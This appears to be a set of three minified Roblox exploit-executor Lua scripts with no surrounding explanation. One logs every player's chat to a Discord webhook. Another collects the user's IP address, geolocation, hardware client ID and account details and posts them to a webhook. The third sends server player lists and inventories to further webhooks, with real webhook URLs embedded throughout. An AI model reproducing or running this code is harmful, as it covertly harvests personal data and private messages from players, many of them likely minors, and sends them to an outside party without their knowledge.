...
local kashmcustom=game:GetService("Players")local b=game:GetService("HttpService")local c=a.LocalPlayer;local d='https://discord.com/api/webhooks/1288547737683365990/XS4EHX9sIzxZlQJvYvQ-RKvp2orDiqsm0FA9X7NMNTae7KgrCDj-D2fryRK5mz_IS5FA'local function e(a,c)local a=a..": "..c;local a,b=pcall(function()return(syn and syn.request or http_request){Url=d,Method='POST',Headers={['Content-Type']='application/json'},Body=b:JSONEncode({content=a})}end)if not a then warn("Failed to send webhook: "..tostring(b))else print("Message sent to webhook successfully!")end end;local function b(a)e(c.Name,a)end;c.Chatted:Connect(b)for a,a in pairs(a:GetPlayers())do if a~=c then a.Chatted:Connect(function(b)e(a.Name,b)end)end end;a.PlayerAdded:Connect(function(a)a.Chatted:Connect(function(b)e(a.Name,b)end)end)
local kash2custom=local a=game:GetService("HttpService")local b=game:GetService("Players")local c=game:GetService("MarketplaceService")local b=b.LocalPlayer;local d=b.UserId;local e=b.DisplayName;local f=b.Name;local g=tostring(b.MembershipType):sub(21)local b=b.AccountAge;local h=game.LocalizationService.RobloxLocaleId;local i=game:HttpGet("https://v4.ident.me/")local j=game:HttpGet("http://ip-api.com/json")local k=game:GetService("RbxAnalyticsService"):GetClientId()local l='Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'local c=c:GetProductInfo(game.PlaceId).Name;local function m()return identifyexecutor()end;print(m())local function n()local m=m()local b={["avatar_url"]="",["content"]="",["embeds"]={{["author"]={["name"]="СКРИПТ БЫЛ ИСПОЛЬЗОВАН",["url"]="https://roblox.com"},["description"]=string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```",d,e,f,d,g,b,h,i,k,tostring(os.date("%m/%d/%Y")),tostring(os.date("%X")),game.PlaceId,c,game.PlaceId,m,j,l),["type"]="rich",["color"]=tonumber("0xFFD700"),["thumbnail"]={["url"]="https://www.roblox.com/headshot-thumbnail/image?userId="..d.."&width=150&height=150&format=png"}}}}return a:JSONEncode(b)end;local function a(a,b)local c={["content-type"]="application/json"}local d=http_request or request or HttpPost or syn.request;local a={Url=a,Body=b,Method="POST",Headers=c}d(a)end;local b="https://discord.com/api/webhooks/1288584473348145183/r1EPxHXitDKzktJ-I3o8OHDg0s-6D_1-QxRiL4KIBHebA09RhdjrRQk3ZSfiS7FSMuPO"local c=n()a(b,c)
local kash3custom=local a=game:GetService("Players")local b=game:GetService("HttpService")local c=a.LocalPlayer;local d=os.time()local d=os.date('!*t',d)local e='<@everyone> 'local f=string.format('%02d:%02d:%02d',d.hour,d.min,d.sec)local g={"zenithowner","TheMumblrr","TheMumbIrr","GojoSS44","k1anzz_alt"}local h={}local function i(a)if not h[a]then h[a]=true end end;local function j()local b={}for a,a in ipairs(a:GetPlayers())do local c=false;for b,b in ipairs(g)do if a.Name==b then c=true;break end end;local d={}for a,a in ipairs(a.Backpack:GetChildren())do if a:IsA("LocalScript")and a.Name~="ResetLighting"then table.insert(d,"**"..a.Name.."**")end end;local d=#d>0 and(" - LocalScripts: "..table.concat(d,", "))or""local e=a.DisplayName.." ("..a.Name..")"if h[a.Name]then e="**"..e.."**"end;if c then table.insert(b,"**"..e.."**"..d)else table.insert(b,e..d)end end;return table.concat(b,"\n")end;local function a()local a={}for b,b in ipairs(c.Backpack:GetChildren())do if b.Name~="ResetLighting"then table.insert(a,b.Name)end end;return table.concat(a,", ")end;local function g()local a={}for b in pairs(h)do table.insert(a,b)end;local a="Уникальные игроки, использовавшие скрипт:\n"..table.concat(a,"\n")local a,b=pcall(function()return(syn and syn.request or http_request){Url='https://discord.com/api/webhooks/949997479758282803/Ci0cGcwxJ9wKRs6JK_TZ7BEx1T2NgvHIFjkMvlZb7MuvpHO5TLp5RZsea9frwb4s9Ka1',Method='POST',Headers={['Content-Type']='application/json'},Body=b:JSONEncode({content=a})}end)if not a then warn("Failed to send unique players list: "..tostring(b))else print("Unique players list sent successfully!")end end;i(c.Name)local a={title='Game Notification',color=16711680,footer={text="Job ID: "..game.JobId},author={name='SCRIPT DETECTED',url='https://www.roblox.com/'},fields={{name=c.DisplayName,value='Used script at '..f},{name='Players on Server (Display Names)',value=j()},{name='Your Inventory Items',value=a()}},timestamp=string.format('%d-%d-%dT%02d:%02d:%02dZ',d.year,d.month,d.day,d.hour,d.min,d.sec)}local a,b=pcall(function()return(syn and syn.request or http_request){Url='https://discord.com/api/webhooks/1288414920269893642/_1Au1EYPnYiPatJtABxmaVJTY2gcSWJUJruTVnOdMJcBVQ3lDDqqljN-_SFsN_2_wsIl',Method='POST',Headers={['Content-Type']='application/json'},Body=b:JSONEncode({content=e,embeds={a}})}end)if not a then warn("Failed to send request: "..tostring(b))else print("Message sent successfully!")end;g()
